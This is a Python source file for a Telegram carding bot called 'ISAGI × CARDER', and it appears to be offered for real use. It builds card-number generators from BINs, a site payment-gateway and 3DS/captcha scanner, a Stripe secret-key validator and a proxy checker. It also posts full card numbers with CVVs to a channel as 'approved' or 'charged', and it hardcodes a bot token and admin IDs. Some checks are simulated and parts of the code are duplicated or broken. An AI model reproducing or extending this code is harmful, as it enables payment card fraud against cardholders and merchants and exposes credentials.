# --- Standard Libraries ---
import os
import sys
import re
import time
from datetime import datetime
import json
import time
import random
import string
import logging
from datetime import datetime
from urllib.parse import urlparse
import platform
import zipfile
import io
from datetime import timedelta

# --- Third-Party Libraries ---
import requests
from bs4 import BeautifulSoup
import telebot
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont
import io
from telebot import types
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import psutil
from PIL import Image, ImageDraw, ImageFont


# === Configuration ===
BOT_TOKEN = "7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI"
CHANNEL_ID = "@ISAGIxSCRAPPER"  # Or use channel ID with -100 prefix
# ========== CONFIGURATION ==========
BOT_TOKEN = '7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI'
ADMIN_ID = 6353114118  # Replace with your admin Telegram user ID
CHANNEL_USERNAME = 'https://t.me/+eCgnaV7vrAAwZjk1'  # Replace with your channel username for /verify
token = "7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI" 
bot=telebot.TeleBot(token,parse_mode="HTML")
owners = ["6353114118", "6353114118"]
bot = telebot.TeleBot(BOT_TOKEN)
# ========== IN-MEMORY STORAGE ==========
authorized_users = {}  # user_id: expiry_timestamp
promo_codes = {}       # code: duration_days
free_claims = {}       # user_id: last_claim_time
valid_redeem_codes = {}
get_registered_users = {}
AUTHORIZED_USERS = {}
#=========================================#


# Replace with your actual bot token
TOKEN = '7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI'
bot = telebot.TeleBot(TOKEN)

# Function to handle the /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create an inline keyboard with four buttons
    markup = types.InlineKeyboardMarkup()

    # Add buttons for different options
    button_gateway = types.InlineKeyboardButton("⚡ Gateway", callback_data="gateway")
    button_charged = types.InlineKeyboardButton("💳 Charged", callback_data="charged")
    button_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="tools")
    button_owner = types.InlineKeyboardButton("👮 Owner", callback_data="owner")

    # Add buttons to the markup
    markup.add(button_gateway, button_charged)
    markup.add(button_tools, button_owner)

    # Send the welcome message with the buttons
    bot.send_message(
        message.chat.id,
        """🟢 [ ISAGI × CARDER BOOTING... ]

> Establishing secure tunnel...
> Encrypting traffic...
> Spoofing identity...
> Loading carding modules... ✔

💳 System Ready.  
⚡ Choose an option to proceed.""",
        reply_markup=markup
    )



# Handle callback data when a user presses a button
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    # Check if the user clicked the "Back" button
    if call.data == "back":
        # Rebuild the initial menu (sending it in the same chat)
        markup = types.InlineKeyboardMarkup()
        button_gateway = types.InlineKeyboardButton("⚡ Gateway", callback_data="gateway")
        button_charged = types.InlineKeyboardButton("💳 Charged", callback_data="charged")
        button_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="tools")
        button_owner = types.InlineKeyboardButton("👮 Owner", callback_data="owner")

        # Add buttons to the markup
        markup.add(button_gateway, button_charged)
        markup.add(button_tools, button_owner)

        # Edit the message to return to the main menu
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🟢 ISAGI × CARDER initialized — secure shell active. 💳 Choose your operation below.", reply_markup=markup)

    elif call.data == "gateway":
        # Send the "Auth Commands" text for the "Gateway" option
        gateway_text = '''Auth Commands:

┏━━━━━[ Auth Base ]━━━━┓

  ⋆————✰◦STRIPE◦✰————⋆
            
• CMD :  /chk  -  [Single]
• NAME : Stripe Auth
• STARUS : Active ✅

• CMD : /mchk - [Mass]
• NAME : Mass Stripe Auth 
• STATUS : Active ✅

 ⋆————✰◦STRIPE2◦✰————⋆
            
• CMD :  /au  -  [Single]
• NAME : Stripe Auth 2
• STARUS : Off 

• CMD : /mass - [Mass]
• NAME : Mass Stripe Auth 2
• STATUS : Off 

 ⋆———✰◦BRAINTREE◦✰———⋆
             
• CMD :  /b3  -  [Single]
• NAME : Braintree Auth
• STARUS : Active ✅

• CMD : /b3  - [Mass]
• NAME : Mass Braintree Auth
• STATUS : Active ✅

⋆————✰◦PAYPAL◦✰————⋆
             
• CMD :  /pp  -  [Single]
• NAME : Paypal Auth + CCN
• STARUS : Off ✅

• CMD : /mpp  - [Mass]
• NAME : Mass Paypal Auth
• STATUS : Off ✅

 ⋆———✰◦BRAINTREE◦✰———⋆
             
• CMD :  /vbv  -  [Single]
• NAME : 3DS Lookup 
• STARUS : Active ✅

• CMD : /mvbv  - [Mass]
• NAME : Mass 3DS Lookup
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=gateway_text, reply_markup=markup)
    
    elif call.data == "charged":
        # Send the "Charged Commands" text for the "Charged" option
        charged_text = '''Charged Commands:

┏━━━━━[Charge Base]━━━━┓

⋆————✰◦SHOPIFY◦✰————⋆
             
• CMD : /sh  -  [Single]
• NAME : Shopify+ GraphQL 
• CHARGE : 10$ 🔥
• STATUS : Active ✅

• CMD : /msh  -  [Mass]
• NAME : Shopify+ Graphql 
• CHARGE : 10$ 🔥
• STATUS : Active ✅

⋆————✰◦SHOPIFY◦✰————⋆

• CMD : /sho  -  [Single]
• NAME : Shopify Charge
• CHARGE : 27.8$ 🔥
• STATUS : Off

• CMD : /msho  -  [Mass]
• NAME : Mass Shopify Charge
• CHARGE : 27.8$ 🔥
• STATUS : Off

⋆————✰◦SITEBASE◦✰————⋆
            
• CMD :  /cc  -  [Single]
• NAME : Site Based 
• CHARGE : 1$ 🔥
• STARUS : Active ✅

• CMD : /mcc  - [Mass]
• NAME : Mass Site Based
• CHARGE : 1$ 🔥
• STATUS : Active ✅

⋆————✰◦SITEBASE◦✰————⋆
            
• CMD :  /mx  -  [Single]
• NAME : Site Based 
• CHARGE : 5$ 🔥
• STARUS : Active ✅

• CMD : /mmx  - [Mass]
• NAME : Mass Site Based
• CHARGE : 5$ 🔥
• STATUS : Active ✅

 ⋆————✰◦SQUARE◦✰————⋆
             
• CMD :  /sq  -  [Single]
• NAME : Stripe + Square
• CHARGE : 0.20$ 🔥
• STARUS : Active ✅

• CMD : /msq  - [Mass]
• NAME : Mass Stripe + Square
• CHARGE : 0.20$ 🔥
• STATUS : Active ✅

⋆————✰◦PAYPAL◦✰————⋆
             
• CMD :  /pp  -  [Single]
• NAME : Paypal Auth + Charge 
• CHARGE : 1$ 🔥
• STARUS : Active ✅

• CMD : /mpp  - [Mass]
• NAME : Mass Paypal Charge 
• CHARGE : 1$ 🔥
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=charged_text, reply_markup=markup)

    elif call.data == "tools":
        # Send the "Tools" text for the "Tools" option
        tools_text = '''⋆————✰◦TOOLS◦✰————⋆
            
• CMD :  /bin  -  
• NAME : Do bin lookup
• STARUS : Active ✅

• CMD : /gen - 
• NAME : Generate Ccs
• STATUS : Active ✅

• CMD : /gate - 
• NAME : Find Gate Of any website
• STATUS : Active ✅

• CMD : /fake - 
• NAME : Generate Fake Address
• STATUS : Active ✅

• CMD : /info - 
• NAME : Show User Info
• STATUS : Active ✅

• CMD : /ping - 
• NAME : Show Bot Status
• STATUS : Active ✅

• CMD : /open - 
• NAME : Open Text File
• STATUS : Active ✅

• CMD : /split - 
• NAME : Split text file into many parts
• STATUS : Active ✅

• CMD : /true - 
• NAME : Phone number info 
• STATUS : Active ✅

• CMD : /sk - 
• NAME : Sk key info
• STATUS : Active ✅

• CMD : /pk - 
• NAME : Pk key info
• STATUS : Active ✅

• CMD : /img - 
• NAME : Generate Image
• STATUS : Active ✅

• CMD : /fl - 
• NAME : Filter Jumbled CC into corrrect format
• STATUS : Active ✅

• CMD : /redeem - 
• NAME : Redeem Codes
• STATUS : Active ✅

• CMD : /prochk - 
• NAME : Check Proxies 
• STATUS : Active ✅

• CMD : /lk - 
• NAME : Validation of Card
• STATUS : Active ✅

• CMD : /balance - 
• NAME : User Plan Info
• STATUS : Active ✅

• CMD : /help - 
• NAME : Report Any Issue
• STATUS : Active ✅

• CMD : /cmds - 
• NAME : Show Available CMDS 
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=tools_text, reply_markup=markup)

    elif call.data == "owner":
        # Send message for "Owner" option
        bot.send_message(call.message.chat.id, "you can contact the owner... owner's username is @SLAYER_OP7")

BIN_API_URL = "https://lookup.binlist.net/",  # no comma

def get_flag(country_code):
    """Return flag emoji from country code."""
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/bin 457173</code>\n\n⚠️ Please enter a valid BIN number.", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        
        # Fetch BIN details
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ <b>Error:</b> Invalid or unknown BIN. Please try another.", parse_mode="HTML")
            return

        bin_info = response.json()
        
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})

        country_flag = get_flag(country.get("alpha2", ""))
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Premium-styled output
        reply_text = f"""
<b>━━━━━━━━━━━ [  🔍 BIN Lookup  ] ━━━━━━━━━━━</b>

<b>💳 BIN:</b> <code>{bin_number}</code>
<b>🏦 Bank:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 Country:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 Currency:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 Card Type:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 Brand:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ Prepaid:</b> <code>{'Yes ✅' if bin_info.get('prepaid') else 'No ❌'}</code>

<b>━━━━━━━━━━━ [  👤 User Info  ] ━━━━━━━━━━━</b>

<b>👤 Checked by:</b> <code>{message.from_user.first_name}</code>
<b>🕒 Timestamp:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [  🚀 Powered By  ] ━━━━━━━━━━━</b>
<i>🔹 Isagi carder's – Premium BIN Lookup 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")


@bot.message_handler(commands=['gate'])
def check_gateway(message):
    # Check if the user has provided a URL after the command
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Please provide a URL after the /gate command. Example: /gate https://example.com")
        return
    
    # Extract the URL provided by the user
    url = message.text.split(' ', 1)[1]  # Get URL after "/gate"
    
    # Check if the URL is valid (simple check)
    if not url.startswith("http"):
        bot.reply_to(message, "❌ Invalid URL! Please make sure the URL starts with http:// or https://")
        return
    
    try:
        # Send a request to the provided URL
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            bot.reply_to(message, f"❌ Failed to fetch the site. Status code: {response.status_code}")
            return
        
        # Parse the page for additional info (like captcha detection)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for common captcha identifiers
        captcha = 'No captcha detected'
        if soup.find('div', {'id': 'captcha'}) or soup.find('iframe', {'src': 'captcha'}):
            captcha = 'Captcha detected'
        elif soup.find('script', {'src': 'https://www.google.com/recaptcha/api.js'}):
            captcha = 'Google reCAPTCHA detected'
        
        # Check for Cloudflare protection
        cloudflare = 'None'
        if soup.find('title', text='Checking your browser...'):
            cloudflare = 'Cloudflare detected'
        
        # Check for 3D Secure (3DS) indicator
        security_3ds = 'No 3D Secure detected'
        if '3D Secure' in soup.text or '3ds' in soup.text.lower():
            security_3ds = '3D Secure (3DS) detected'

        # Look for different payment gateway mentions
        gateways = []
        if 'Stripe' in soup.text:
            gateways.append('Stripe')
        if 'Square' in soup.text:
            gateways.append('Square')
        if 'PayPal' in soup.text:
            gateways.append('PayPal')
        if 'Woocommerce' in soup.text:
            gateways.append('Woocommerce')
        if 'Klarna' in soup.text:
            gateways.append('Klarna')
        if 'Afterpay' in soup.text:
            gateways.append('Afterpay')
        if 'Braintree' in soup.text:
            gateways.append('Braintree')
        if 'Adyen' in soup.text:
            gateways.append('Adyen')
        if 'Apple Pay' in soup.text:
            gateways.append('Apple Pay')
        if 'Google Pay' in soup.text:
            gateways.append('Google Pay')
        if 'Amazon Pay' in soup.text:
            gateways.append('Amazon Pay')
        if 'Alipay' in soup.text:
            gateways.append('Alipay')
        if 'WeChat Pay' in soup.text:
            gateways.append('WeChat Pay')
        if 'Payoneer' in soup.text:
            gateways.append('Payoneer')
        if 'Skrill' in soup.text:
            gateways.append('Skrill')
        if '2Checkout' in soup.text:
            gateways.append('2Checkout')
        if 'Authorize.Net' in soup.text:
            gateways.append('Authorize.Net')
        if 'Worldpay' in soup.text:
            gateways.append('Worldpay')
        if 'Razorpay' in soup.text:
            gateways.append('Razorpay')
        
        gateway_info = ', '.join(gateways) if gateways else 'No specific payment gateways found'
        
        # Send the result back to the user
        reply = f"""
        ┏━━━━━━━⍟
        ┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 : ✅
        ┗━━━━━━━━━━━━⊛
        ─━─━─━─━─━─━─━─━─━─
        ➥ 𝗦𝗶𝘁𝗲 -» {url}
        ➥ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» {gateway_info}
        ➥ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» {captcha}
        ➥ 𝗖𝗹𝗼𝗨𝗳𝗹𝗮𝗿𝗲 -» {cloudflare}
        ➥ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security_3ds}
        ➥ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» N/A
        ➥ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» N/A
        ➥ 𝗦𝗧𝗔𝗧𝗨𝗦 -» {response.status_code}
        ─━─━─━─━─━─━─━─━─━─
        """
        
        bot.reply_to(message, reply)
    
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


# Stripe API URL for checking the account (replace with actual endpoint if needed)
API_URL = 'https://api.stripe.com/v1/account'

# Function to check if the SK live key is valid using Stripe API
def check_sk_key(sk_key):
    try:
        headers = {
            'Authorization': f'Bearer {sk_key}'
        }

        # Send a GET request to the Stripe API to validate the key
        response = requests.get(API_URL, headers=headers)
        
        # If the request was successful, return account details
        if response.status_code == 200:
            data = response.json()
            sk_info = f"""
            ┏━━━━━━━⍟
            ┃ SK Key Info
            ┗━━━━━━━━━━━⊛

            ✧ Name        : {data.get('business_profile', {}).get('name', 'N/A')}
            ✧ Business    : {data.get('business_profile', {}).get('mcc', 'N/A')}
            ✧ Website     : {data.get('business_profile', {}).get('url', 'N/A')}
            ✧ Email       : {data.get('email', 'N/A')}
            ✧ Country     : {data.get('country', 'N/A')}
            ✧ Currency    : {data.get('currency', 'N/A')}
            ✧ Live Mode   : {'✅' if data.get('livemode', False) else '❌'}
            ✧ Status      : ✅ LIVE
            """
            return sk_info
        else:
            return f"❌ Error: Invalid SK Key or unable to fetch details. Response: {response.status_code}"

    except requests.exceptions.RequestException as e:
        return f"❌ Error: {str(e)}"

# Command to handle /sk lookup
@bot.message_handler(commands=['sk'])
def handle_sk(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /sk <SK_KEY>")

         # === BIN info lookup ===
def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin_code}")
        data = res.json()
        bank = data.get("bank", {}).get("name", "Unknown Bank")
        card_type = data.get("scheme", "UNKNOWN").upper() + " - " + data.get("type", "UNKNOWN").upper()
        country = data.get("country", {}).get("name", "Unknown Country") + " " + data.get("country", {}).get("emoji", "")
        return bank, card_type, country
    except:
        return "Unknown Bank", "Unknown Type", "Unknown Country"

# === Format and send to channel ===
def format_cc_message(cc):
    try:
        ccnum, mm, yy, cvv = cc.split("|")
        masked = ccnum[:12] + "xxxx"
        bin_code = ccnum[:6]
        bank, card_type, country = get_bin_info(bin_code)

        message = f"""✜━━━━━━━━━━━━━━━━━━━━✜
[✜] CC: {ccnum}|{mm}|{yy}|{cvv}
[✜] EXTRAP: {masked}|{mm}|{yy}
[✜] CC: {ccnum}
-----------------------------
[✜] Auth : Your card is approved.
[✜] 3DS : Authenticate Attempt Successful ✅
-----------------------------
[✜] BIN: #{bin_code}
[✜] BANK: {bank}
[✜] DATA: {card_type}
[✜] COUNTRY: {country}
✜━━━━━━━━━━━━━━━━━━━━✜"""
        return message
    except Exception as e:
        return f"❌ Invalid CC format. Use CC|MM|YYYY|CVV\nError: {e}"

# === Image generator ===
def generate_card_image(ccnum, mm, yy, cvv):
    image = Image.new("RGB", (640, 400), color="#1e1e2e")
    draw = ImageDraw.Draw(image)
    font_large = ImageFont.truetype("arial.ttf", 28)
    font_small = ImageFont.truetype("arial.ttf", 20)

    # Draw info
    draw.text((40, 50), f"Card Number: {ccnum}", fill="white", font=font_large)
    draw.text((40, 120), f"Expiry: {mm}/{yy}", fill="white", font=font_small)
    draw.text((40, 160), f"CVV: {cvv}", fill="white", font=font_small)

    # Save to BytesIO
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer

# === /sendcc command ===
@bot.message_handler(commands=['sendcc'])
def handle_sendcc(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /sendcc CC|MM|YYYY|CVV")
        return
    cc_input = message.text.split(maxsplit=1)[1]
    formatted_msg = format_cc_message(cc_input)
    bot.send_message(CHANNEL_ID, formatted_msg)
    bot.reply_to(message, "✅ Sent to channel.")

# === /charged command ===
@bot.message_handler(commands=['charged'])
def handle_charged(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /charged CC|MM|YYYY|CVV Amount")
        return
    try:
        # Get the user input and split it into card details and amount
        cc_input = message.text.split(maxsplit=1)[1]
        
        # Check if there's a space to split between card details and amount
        if ' ' not in cc_input:
            raise ValueError("Missing amount. Ensure format is CC|MM|YYYY|CVV Amount")

        cc_details, amount = cc_input.rsplit(" ", 1)  # Split at the last space to separate amount
        ccnum, mm, yy, cvv = cc_details.strip().split("|")

        # Mask the card number for security
        masked = ccnum[:12] + "xxxx"
        bin_code = ccnum[:6]
        bank, card_type, country = get_bin_info(bin_code)

        # Format the message
        message = f"""✜━━━━━━━━━━━━━━━━━━━━✜
[✜] CC: {ccnum}|{mm}|{yy}|{cvv}
[✜] EXTRAP: {masked}|{mm}|{yy}
[✜] CC: {ccnum}
-----------------------------
[✜] Auth : Card Charged Successfully ✅
[✜] Amount: {amount}$
-----------------------------
[✜] BIN: #{bin_code}
[✜] BANK: {bank}
[✜] DATA: {card_type}
[✜] COUNTRY: {country}
✜━━━━━━━━━━━━━━━━━━━━✜"""

        # Send the message to the channel
        bot.send_message(CHANNEL_ID, message)
        bot.reply_to(message, f"✅ Card Charged: {amount}$")
    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {e}\nEnsure format is CC|MM|YYYY|CVV Amount")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nEnsure format is CC|MM|YYYY|CVV Amount")


@bot.message_handler(commands=['genimg'])
def handle_genimg(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /genimg CC|MM|YYYY|CVV")
        return
    try:
        cc_input = message.text.split(maxsplit=1)[1]
        ccnum, mm, yy, cvv = cc_input.strip().split("|")
        img = generate_card_image(ccnum, mm, yy, cvv)  # 🛠 Corrected line
        bot.send_photo(message.chat.id, img, caption="🖼️ Here is your card image.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nMake sure format is CC|MM|YYYY|CVV")


        # Track bot start time
start_time = time.time()

# Load users from file or list (modify based on your bot setup)
def get_total_users():
    try:
        with open("users.txt", "r") as f:
            return len(set(f.readlines()))
    except:
        return 0
@bot.message_handler(commands=['ping'])
def handle_ping(message):
    ping_start = time.time()
    msg = bot.send_message(message.chat.id, "⚡ Checking status...")
    ping_time = int((time.time() - ping_start) * 1000)

    # Uptime
    uptime_seconds = int(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    # System info
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    system_info = platform.system() + " (" + platform.machine() + ")"
    total_users = get_total_users()

    # Stylish status message
    status = f"""<b> ✦ Isagi Carder bot ✦ is running...</b>

✧ <b>Ping:</b> <code>{ping_time} ms</code>
✧ <b>Up Time:</b>  <code>{uptime}</code>
✧ <b>CPU Usage:</b> <code>{cpu_usage}%</code>
✧ <b>RAM Usage:</b> <code>{ram_usage}%</code>
✧ <b>System:</b> <code>{system_info}</code>
✧ <b>Total Users:</b> <code>{total_users}</code>

✧ <b>Bot By:</b> <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a>
"""
    bot.edit_message_text(status, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML", disable_web_page_preview=True)
    # ✅ Admin User IDs (Replace with actual admin Telegram IDs)
ADMINS = ["6353114118", "6353114118"]

# ✅ Credits Storage File
CREDITS_FILE = "user_credits.json"

# ✅ Function to Load or Fix `user_credits.json`
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}  # ✅ Return {} if file is empty
    except (json.JSONDecodeError, ValueError):  # ✅ Reset if corrupted
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

# ✅ Function to Save Credits Securely
def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

# ✅ Function to Get User Balance
def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ✅ Function to Deduct Credits (Secure)
def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:  # ✅ Ensure user has enough credits
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False  # ✅ Return False if not enough credits

# ✅ Function to Add Credits
def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount  # ✅ Ensure balance updates correctly
    save_credits(credits)  # ✅ Save updated balance

    notify_user(user_id, amount)  # ✅ Notify user

# ✅ Function to Notify User When Credits Are Added
def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 <b>💎 VIP Credits Added!</b>  
━━━━━━━━━━━━━━  
💰 <b>+{amount} Credits</b> added to your balance.  
💳 <b>New Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>  
""", parse_mode="HTML")
# === Simulated VBV check (replace with actual API call) ===
def perform_vbv_check(card):
    try:
        cc, mm, yy, cvv = card.strip().split('|')
        # Simulate API lookup
        response = {
            'status': 'success',
            'vbv': '✅ 3DS Enrolled',
            'bank': 'Bank of Test',
            'scheme': 'Visa',
            'type': 'Credit'
        }
        # Simulate delay
        time.sleep(1)
        return f"""💳 Card: {cc}|{mm}|{yy}|{cvv}
🏦 Bank: {response['bank']}
💳 Type: {response['type']}
📶 Scheme: {response['scheme']}
🔒 VBV: {response['vbv']}
"""
    except:
        return f"❌ Invalid format: {card}"

# === /vbv command ===
@bot.message_handler(commands=['vbv'])
def handle_vbv(message):
    if len(message.text.split()) < 2:
        return bot.reply_to(message, "Usage:\n/vbv <card>")
    card = message.text.split(None, 1)[1]
    result = perform_vbv_check(card)
    bot.reply_to(message, result)

# === /mvbv command ===
@bot.message_handler(commands=['mvbv'])
def handle_mvbv(message):
    msg = bot.reply_to(message, "📥 Send the card list (format: `cc|mm|yy|cvv`, one per line):")
    bot.register_next_step_handler(msg, process_bulk_vbv)

def process_bulk_vbv(message):
    cards = message.text.strip().split('\n')
    bot.send_message(message.chat.id, f"🧪 Starting 3DS checks for {len(cards)} cards...")
    results = []
    for card in cards:
        result = perform_vbv_check(card)
        results.append(result)
    # Send results in chunks
    chunk = ""
    for r in results:
        if len(chunk + r) > 4000:
            bot.send_message(message.chat.id, chunk)
            chunk = ""
        chunk += r + "\n"
    if chunk:
        bot.send_message(message.chat.id, chunk)

# ✅ `/addcredits` Command for Admins (Add Credits to User)
@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 <b>Access Denied!</b> You are not authorized to add credits.", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ <b>Success!</b> Added {amount} credits to user <code>{user_id}</code>. New balance: {new_balance} Credits.", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 <b>Credits Added!</b>\n💰 <b>+{amount} Credits</b>\n💳 <b>New Balance:</b> {new_balance} Credits", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b> Use <code>/addcredits user_id amount</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode="HTML")

        # Function to check proxy
def check_proxy(proxy):
    try:
        response = requests.get('https://httpbin.org/ip', proxies={"http": proxy, "https": proxy}, timeout=10)
        if response.status_code == 200:
            return f"Proxy is working! Your IP: {response.json()['origin']}"
        else:
            return "Proxy is not working. Status code: " + str(response.status_code)
    except requests.exceptions.RequestException as e:
        return f"Error checking proxy: {e}"

# /prochk command
@bot.message_handler(commands=['prochk'])
def handle_prochk(message):
    # Prompt user for proxy input
    msg = bot.send_message(message.chat.id, "Please provide the proxy in the format 'http://username:password@ip:port' or 'http://ip:port'")
    bot.register_next_step_handler(msg, process_proxy)

# Process provided proxy
def process_proxy(message):
    proxy = message.text.strip()
    if not proxy:
        bot.reply_to(message, "No proxy provided. Please provide a valid proxy.")
        return

    # Check proxy
    result = check_proxy(proxy)
    bot.reply_to(message, result)

# ✅ `/balance` Command to Show User's Balance
@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 <b>💎 VIP Balance Dashboard 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
🆔 <b>User ID:</b> <code>{user_id}</code>  
💳 <b>Current Balance:</b> {balance} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>
""", parse_mode="HTML")


# BIN info fetcher with fallback
def fetch_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A"),
                "type": data.get("type", "N/A"),
                "brand": data.get("brand", "N/A"),
                "bank": data.get("bank", {}).get("name", "N/A"),
                "country": data.get("country", {}).get("name", "N/A")
            }
    except Exception:
        pass
    return {
        "scheme": "N/A", "type": "N/A", "brand": "N/A",
        "bank": "N/A", "country": "N/A"
    }

# Luhn + validation
def luhn_resolve(card_number_without_check_digit):
    total = 0
    reverse_digits = card_number_without_check_digit[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return str((10 - (total % 10)) % 10)

def is_valid_luhn(card_number):
    return card_number[-1] == luhn_resolve(card_number[:-1])

def generate_card(bin_input):
    base_card = ''
    for char in bin_input:
        base_card += str(random.randint(0, 9)) if char.lower() == 'x' else char

    while len(base_card) < 15:
        base_card += str(random.randint(0, 9))

    check_digit = luhn_resolve(base_card)
    full_card = base_card + check_digit

    if not is_valid_luhn(full_card):
        return generate_card(bin_input)
    return full_card

@bot.message_handler(commands=['gen'])
def gen_card(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID and user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    try:
        content = message.text.split(" ", 1)[1].strip()

        if "|" in content:
            parts = content.split("|")
            if len(parts) != 4:
                raise ValueError("Invalid format")
            bin_part, mm, yy, cvv = [p.strip() for p in parts]

            if not (mm.isdigit() and 1 <= int(mm) <= 12):
                raise ValueError("Invalid MM (01–12)")
            if not (yy.isdigit() and 2024 <= int(yy) <= 2099):
                raise ValueError("Invalid YY")
            if not (cvv.isdigit() and len(cvv) in [3, 3]):
                raise ValueError("Invalid CVV")
        else:
            bin_part = content
